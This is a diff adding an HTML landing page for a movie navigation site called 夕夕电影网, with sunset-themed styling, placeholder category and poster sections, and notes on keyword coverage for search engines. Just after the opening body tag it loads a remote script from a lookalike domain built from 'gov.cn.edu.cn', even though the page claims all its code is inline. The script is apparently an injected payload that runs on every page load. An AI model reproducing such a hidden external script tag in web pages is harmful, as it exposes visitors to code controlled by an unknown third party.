@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>夕夕电影网 - 每个黄昏，一部好片</title>
+<meta name="description" content="夕夕电影网（xixidianyingwang-h5）是黄昏童话风电影导航站：热映、经典、动漫、纪录片、深夜场像晚风里的五个方向，连看五部像萤火虫一盏盏亮起，移动端自适应，内页链接均为 # 占位。">
+<meta name="keywords" content="夕夕电影网, 电影导航, 热映电影, 经典老片, 动漫, 纪录片, 深夜场, 黄昏片单, xixidianyingwang-h5">
+<style>
+:root{
+  --sunset:#ff8c5a;
+  --sunset-2:#ff6b45;
+  --dusk:#4a5d8a;
+  --dusk-2:#2d3e5f;
+  --firefly:#c8e84a;
+  --firefly-dim:#c8e84a33;
+  --warm:#fdf6ee;
+  --night:#1a1525;
+  --night-2:#221d30;
+  --line:#3a3250;
+  --ink:#f0eaf7;
+  --muted:#a098b8;
+  --shadow:0 18px 40px rgba(255,140,90,.22);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",-apple-system,sans-serif;
+  background:
+    radial-gradient(680px 320px at 50% -20%, rgba(255,140,90,.25), transparent 60%),
+    radial-gradient(680px 380px at 100% 100%, rgba(74,93,138,.3), transparent 55%),
+    var(--night);
+  color:var(--ink);line-height:1.8;overflow-x:hidden;
+}
+a{color:var(--firefly);text-decoration:none;transition:.2s}
+a:hover{color:var(--sunset)}
+
+.topbar{background:linear-gradient(90deg,var(--night-2),var(--night));color:var(--ink);font-size:.72rem;font-weight:700;padding:.35rem 1rem;display:flex;justify-content:space-between;gap:.5rem;flex-wrap:wrap;border-bottom:3px solid var(--sunset)}
+.topbar .glow{color:var(--firefly)}
+
+.header{position:sticky;top:0;z-index:998;background:rgba(26,21,37,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.header-in{max-width:1140px;margin:0 auto;padding:1rem;display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:.6rem}
+.sun{width:46px;height:46px;border-radius:50%;background:linear-gradient(160deg,var(--sunset),var(--dusk));display:flex;align-items:center;justify-content:center;font-size:1.3rem;box-shadow:0 0 20px rgba(255,140,90,.4)}
+.brand-text h1{font-size:1.42rem;font-weight:900}
+.brand-text h1 b{color:var(--sunset)}
+.brand-text p{font-size:.64rem;color:var(--muted);letter-spacing:2px}
+.nav{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav a{padding:.45rem .9rem;border-radius:999px;font-weight:700;font-size:.85rem;border:1px solid var(--line);color:var(--ink);background:var(--night-2)}
+.nav a:hover,.nav a.active{background:var(--sunset);color:#1a1208;border-color:var(--sunset)}
+
+.wrap{max-width:1140px;margin:0 auto;padding:0 1rem}
+
+.hero{padding:3.2rem 0 2.4rem}
+.hill{
+  background:linear-gradient(160deg,var(--night-2),var(--night));border:1px solid var(--line);border-radius:22px;padding:2rem;box-shadow:var(--shadow);
+  display:grid;grid-template-columns:1.3fr .7fr;gap:2rem;align-items:center;position:relative;overflow:hidden;
+}
+.hill::after{content:'🌄';position:absolute;top:-18px;right:18px;font-size:3.4rem;opacity:.12}
+.hill .dusk-tag{font-size:.72rem;font-weight:800;color:var(--sunset);letter-spacing:2px}
+.hill h1{font-size:clamp(2.1rem,6vw,3.4rem);font-weight:900;line-height:1.05;margin:.4rem 0}
+.hill h1 .hl{color:var(--sunset)}
+.hill p{color:var(--muted);max-width:520px}
+.search{margin-top:1.2rem;display:flex;background:var(--night);border:1px solid var(--line);border-radius:12px;overflow:hidden;max-width:520px}
+.search input{flex:1;border:0;outline:0;background:transparent;padding:1rem 1.2rem;font-size:1rem;color:var(--ink)}
+.search button{border:0;cursor:pointer;padding:0 1.5rem;font-weight:900;color:#1a1208;background:var(--sunset)}
+.quick{margin-top:1rem;display:flex;gap:.5rem;flex-wrap:wrap}
+.quick a{font-size:.78rem;border:1px dashed rgba(255,140,90,.3);padding:.3rem .8rem;border-radius:999px;color:var(--sunset)}
+.quick a:hover{background:var(--sunset);color:#1a1208}
+.firefly-art{display:flex;align-items:center;justify-content:center;position:relative}
+.orbs{width:200px;height:200px;position:relative}
+.orb{position:absolute;border-radius:50%;background:var(--firefly);box-shadow:0 0 12px var(--firefly);animation:float 3s ease-in-out infinite}
+.orb:nth-child(1){width:14px;height:14px;top:20%;left:30%;animation-delay:0s}
+.orb:nth-child(2){width:10px;height:10px;top:50%;left:60%;animation-delay:.6s}
+.orb:nth-child(3){width:12px;height:12px;top:70%;left:20%;animation-delay:1.2s}
+.orb:nth-child(4){width:8px;height:8px;top:35%;left:75%;animation-delay:1.8s}
+.orb:nth-child(5){width:11px;height:11px;top:60%;left:10%;animation-delay:2.4s}
+@keyframes float{0%,100%{transform:translateY(0) scale(1);opacity:.8}50%{transform:translateY(-16px) scale(1.2);opacity:1}}
+
+.section{padding:3rem 0;border-top:1px dashed var(--line)}
+.head{display:flex;align-items:center;gap:.7rem;margin-bottom:1.5rem;flex-wrap:wrap}
+.head .icon{width:36px;height:36px;border-radius:10px;background:var(--sunset);color:#1a1208;display:flex;align-items:center;justify-content:center;font-size:1.1rem}
+.head h2{font-size:1.5rem;font-weight:900}
+.head span{margin-left:auto;font-size:.78rem;color:var(--muted)}
+
+/* 晚风方向 */
+.breezes{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:1rem}
+.breeze{background:var(--night-2);border:1px solid var(--line);border-radius:14px;padding:1.1rem;transition:.2s}
+.breeze:hover{transform:translateY(-4px);border-color:var(--sunset);box-shadow:0 0 18px rgba(255,140,90,.18)}
+.breeze .dir{font-size:.7rem;color:var(--dusk);font-weight:800}
+.breeze h3{font-size:1rem;margin:.2rem 0}
+.breeze p{font-size:.76rem;color:var(--muted)}
+.breeze .tag{margin-top:.5rem;font-size:.68rem;color:var(--sunset);font-weight:700}
+
+/* 夕夕时刻海报 */
+.moments{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.2rem}
+.moment{background:var(--night-2);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.2s}
+.moment:hover{transform:translateY(-4px);border-color:var(--firefly);box-shadow:0 0 20px var(--firefly-dim)}
+.moment-pic{height:170px;padding:.8rem;color:#fff;display:flex;flex-direction:column;justify-content:space-between;font-weight:800}
+.m1{background:linear-gradient(160deg,#ff8c5a,#c0392b)}
+.m2{background:linear-gradient(160deg,#4a5d8a,#1a2040)}
+.m3{background:linear-gradient(160deg,#c8e84a,#5a8a1a)}
+.m4{background:linear-gradient(160deg,#ff6b9d,#8a1a4a)}
+.m5{background:linear-gradient(160deg,#7b5ea7,#2a1040)}
+.m6{background:linear-gradient(160deg,#ffd166,#8a5a10)}
+.moment-pic .time{background:rgba(0,0,0,.35);padding:.1rem .5rem;border-radius:6px;font-size:.7rem;align-self:flex-start}
+.moment-cap{padding:.7rem .9rem}
+.moment-cap h3{font-size:.98rem}
+.moment-cap p{font-size:.74rem;color:var(--muted)}
+.moment-cap .tag{margin-top:.4rem;display:inline-block;font-size:.68rem;color:var(--firefly);border:1px solid var(--firefly-dim);padding:.12rem .55rem;border-radius:999px}
+
+/* 睡前故事 */
+.stories{display:flex;gap:1rem;overflow-x:auto;padding:.5rem 0 1rem;scroll-snap-type:x mandatory}
+.story{flex:0 0 160px;scroll-snap-align:start;background:linear-gradient(180deg,var(--night-2),#2a2238);border:1px solid var(--line);border-radius:14px;padding:1rem;text-align:center}
+.story .moon{font-size:1.6rem}
+.story h3{font-size:.9rem;margin:.3rem 0}
+.story p{font-size:.7rem;color:var(--muted)}
+
+/* 关于 */
+.tale{display:grid;grid-template-columns:1.2fr .8fr;gap:2rem;align-items:center;background:var(--night-2);border:1px solid var(--line);border-radius:20px;padding:2.2rem;box-shadow:var(--shadow)}
+.tale h3{font-size:1.4rem;margin-bottom:1rem}
+.tale h3 span{color:var(--sunset)}
+.tale p{color:var(--muted);margin-bottom:.8rem}
+.diary{background:var(--night);border:1px solid var(--line);border-radius:16px;padding:1.3rem}
+.diary h4{color:var(--firefly);margin-bottom:.7rem;font-size:.9rem}
+.diary .row{display:flex;justify-content:space-between;padding:.38rem 0;border-bottom:1px dashed #ffffff14;font-size:.82rem}
+.diary .row:last-child{border-bottom:0}
+.diary .row .k{color:var(--muted)}
+.diary .row .v{color:var(--sunset);font-weight:800}
+
+.footer{margin-top:3rem;border-top:3px solid var(--sunset);padding:2.4rem 1rem;text-align:center;color:var(--muted);font-size:.82rem;background:var(--night-2)}
+.footer h3{color:var(--ink);font-size:1.3rem;margin-bottom:.4rem}
+.footer h3 b{color:var(--sunset)}
+.footer a{color:var(--dusk)}
+
+@media(max-width:768px){
+  .hill{grid-template-columns:1fr}
+  .firefly-art{order:-1}
+  .orbs{width:160px;height:160px}
+  .search{flex-direction:column}
+  .search input{border-bottom:1px solid var(--line)}
+  .search button{padding:1rem}
+  .tale{grid-template-columns:1fr;padding:1.5rem}
+  .breezes{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div>🌅 夕夕电影网 · 每个黄昏，一部好片</div>
+  <div><span class="glow">✨ 萤火虫已亮起</span></div>
+</div>
+
+<header class="header">
+  <div class="header-in">
+    <div class="brand">
+      <div class="sun">🌅</div>
+      <div class="brand-text">
+        <h1>夕夕<b>电影网</b></h1>
+        <p>XIXIDIANYINGWANG-H5.GITHUB.IO</p>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">黄昏山坡</a>
+      <a href="#breezes">晚风方向</a>
+      <a href="#moments">夕夕时刻</a>
+      <a href="#stories">睡前故事</a>
+      <a href="#tale">落日手记</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <section id="home" class="hero">
+    <div class="hill">
+      <div>
+        <div class="dusk-tag">🌅 黄昏放映 · 第 夕夕 场</div>
+        <h1>夕夕<span class="hl">电影网</span></h1>
+        <p>夕夕电影网（xixidianyingwang-h5）像山坡上那个每天黄昏亮灯的小放映棚：热映、经典、动漫、纪录片、深夜场是晚风里的五个方向，连看五部像萤火虫一盏盏亮起来。无弹窗、无广告、无收费，只管坐下看。</p>
+        <div class="search">
+          <input type="text" placeholder="晚风里找：热映 / 经典 / 动漫 / 纪录片 / 深夜场...">
+          <button>开映</button>
+        </div>
+        <div class="quick">
+          <a href="#">🌇 热映方向</a>
+          <a href="#">🎞 经典方向</a>
+          <a href="#">🧸 动漫方向</a>
+          <a href="#">📺 纪录方向</a>
+          <a href="#">🌙 深夜方向</a>
+        </div>
+      </div>
+      <div class="firefly-art">
+        <div class="orbs">
+          <div class="orb"></div><div class="orb"></div><div class="orb"></div><div class="orb"></div><div class="orb"></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="breezes" class="section">
+    <div class="head">
+      <span class="icon">🍃</span>
+      <h2>晚风方向（分类）</h2>
+      <span>5 个方向 + 3 个角落</span>
+    </div>
+    <div class="breezes">
+      <div class="breeze"><div class="dir">WIND · 东</div><h3>热映方向</h3><p>新片、限免、平台首发</p><div class="tag">🌅 最先照到</div></div>
+      <div class="breeze"><div class="dir">WIND · 南</div><h3>经典方向</h3><p>4K修复、胶片重生</p><div class="tag">🌇 余晖最长</div></div>
+      <div class="breeze"><div class="dir">WIND · 西</div><h3>动漫方向</h3><p>国漫、日番、剧场版</p><div class="tag">🎨 色彩最浓</div></div>
+      <div class="breeze"><div class="dir">WIND · 北</div><h3>纪录方向</h3><p>自然、历史、美食</p><div class="tag">📷 最安静</div></div>
+      <div class="breeze"><div class="dir">WIND · 中</div><h3>深夜方向</h3><p>悬疑、文艺、慢电影</p><div class="tag">🌙 萤火最亮</div></div>
+      <div class="breeze"><div class="dir">CORNER · 1</div><h3>合家方向</h3><p>喜剧、贺岁、亲子</p><div class="tag">🧺 野餐位</div></div>
+      <div class="breeze"><div class="dir">CORNER · 2</div><h3>武侠方向</h3><p>刀光、江湖、夕阳红</p><div class="tag">⚔ 逆光剪影</div></div>
+      <div class="breeze"><div class="dir">CORNER · 3</div><h3>冷门方向</h3><p>遗珠、小众、海外老片</p><div class="tag">🔍 夕夕私藏</div></div>
+    </div>
+  </section>
+
+  <section id="moments" class="section">
+    <div class="head">
+      <span class="icon">🕔</span>
+      <h2>夕夕时刻（海报）</h2>
+      <span>6 个黄昏定格</span>
+    </div>
+    <div class="moments">
+      <article class="moment"><div class="moment-pic m1"><span class="time">夕夕 17:30 · 热映</span><span>星际归途</span></div><div class="moment-cap"><h3>星际归途</h3><p>科幻 / 太空 / 2025</p><span class="tag">★ 9.5</span></div></article>
+      <article class="moment"><div class="moment-pic m2"><span class="time">夕夕 18:00 · 经典</span><span>城南旧事</span></div><div class="moment-cap"><h3>城南旧事 4K</h3><p>剧情 / 怀旧 / 1983</p><span class="tag">★ 9.3</span></div></article>
+      <article class="moment"><div class="moment-pic m3"><span class="time">夕夕 18:30 · 动漫</span><span>千羽之城</span></div><div class="moment-cap"><h3>千羽之城</h3><p>国漫 / 奇幻 / 剧场版</p><span class="tag">★ 9.4</span></div></article>
+      <article class="moment"><div class="moment-pic m4"><span class="time">夕夕 19:00 · 纪录</span><span>地球脉动</span></div><div class="moment-cap"><h3>地球脉动</h3><p>自然 / BBC / 神作</p><span class="tag">★ 9.8</span></div></article>
+      <article class="moment"><div class="moment-pic m5"><span class="time">夕夕 19:30 · 悬疑</span><span>第十一夜</span></div><div class="moment-cap"><h3>第十一夜</h3><p>犯罪 / 高分 / 慢热</p><span class="tag">★ 9.2</span></div></article>
+      <article class="moment"><div class="moment-pic m6"><span class="time">夕夕 20:00 · 合家</span><span>打工吧老板</span></div><div class="moment-cap"><h3>打工吧老板</h3><p>喜剧 / 职场 / 贺岁</p><span class="tag">★ 8.9</span></div></article>
+    </div>
+  </section>
+
+  <section id="stories" class="section">
+    <div class="head">
+      <span class="icon">🌙</span>
+      <h2>睡前故事 · 横滑</h2>
+      <span>天黑后慢慢看</span>
+    </div>
+    <div class="stories">
+      <div class="story"><div class="moon">🌙</div><h3>江湖晚钟</h3><p>武侠 / 动作</p></div>
+      <div class="story"><div class="moon">🌙</div><h3>山里的饭</h3><p>美食 / 纪录</p></div>
+      <div class="story"><div class="moon">🌙</div><h3>长安灯火</h3><p>历史 / 古装</p></div>
+      <div class="story"><div class="moon">🌙</div><h3>海边来信</h3><p>爱情 / 文艺</p></div>
+      <div class="story"><div class="moon">🌙</div><h3>雾山五行</h3><p>国漫 / 武侠</p></div>
+      <div class="story"><div class="moon">🌙</div><h3>罗马假日</h3><p>爱情 / 修复</p></div>
+    </div>
+  </section>
+
+  <section id="tale" class="section">
+    <div class="head">
+      <span class="icon">📖</span>
+      <h2>落日手记 / 关于夕夕电影网</h2>
+    </div>
+    <div class="tale">
+      <div>
+        <h3>夕夕电影网 = <span>每个黄昏，一部好片</span></h3>
+        <p><strong>夕夕电影网</strong>（https://xixidianyingwang-h5.github.io）不做货架、不打团战、不卖票根、不摆渡，只做山坡上那个每天黄昏准时亮灯的小放映棚：首页是晚霞山坡，分类是晚风方向，海报是"夕夕时刻"定格，睡前故事是夜深后该看的片。</p>
+        <p>页面用晚霞粉橘+暮蓝+萤火黄绿+暖米白，CSS/JS 全内联，移动端自适应，内页全部 <code>#</code> 占位，不生成 robots.txt / sitemap.xml。关键词"夕夕电影网"覆盖 title / description / keywords / H1 / H2 / 正文 / 页脚；必应侧保证唯一 H1、首段点题、响应式、初始 HTML 含正文。</p>
+        <p><a href="https://xixidianyingwang-h5.github.io">🌐 xixidianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="diary">
+        <h4>📖 放映日志</h4>
+        <div class="row"><span class="k">晚风方向</span><span class="v">8 个</span></div>
+        <div class="row"><span class="k">夕夕时刻</span><span class="v">6 部</span></div>
+        <div class="row"><span class="k">睡前故事</span><span class="v">6 部</span></div>
+        <div class="row"><span class="k">链接</span><span class="v"># 占位</span></div>
+        <div class="row"><span class="k">弹窗</span><span class="v">0</span></div>
+        <div class="row"><span class="k">今日日落</span><span class="v">已收藏</span></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>夕夕<b>电影网</b></h3>
+  <p>黄昏童话风电影导航 · 热映 / 经典 / 动漫 / 纪录片 / 深夜场</p>
+  <p>© 2026 夕夕电影网 | <a href="https://xixidianyingwang-h5.github.io">xixidianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+const links=[...document.querySelectorAll('.nav a')];
+const secs=[...document.querySelectorAll('section[id]')];
+links.forEach(a=>a.addEventListener('click',e=>{
+  const id=a.getAttribute('href');
+  if(id&&id.startsWith('#')&&document.querySelector(id)){
+    e.preventDefault();
+    document.querySelector(id).scrollIntoView({behavior:'smooth',block:'start'});
+  }
+}));
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id;});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
